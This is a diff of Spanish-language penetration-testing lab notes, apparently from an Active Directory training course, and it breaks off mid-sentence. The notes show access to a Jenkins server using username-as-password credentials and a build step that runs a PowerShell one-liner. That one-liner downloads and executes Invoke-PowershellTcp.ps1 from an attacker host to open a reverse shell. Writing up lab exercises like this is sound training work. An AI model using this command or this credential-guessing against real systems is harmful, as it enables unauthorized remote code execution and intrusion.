@@ -51,4 +51,12 @@ Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | 
 Realizaremos los mismos pasos de obtener una Reverse Shell igual que hemos hecho con el [[Laboratorio 05]] aprovechándonos de una vulnerabilidad en Jenkins
 
 Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.11:8080*
-Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres
+Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login
+
+Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *Configure* -> *Add build step*
+Una vez en esa zona de configuracion nos mandaremos una reverse shell a nuetsra maquina
+```shell
+powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
+```
+
+Una vez tenemos introduci
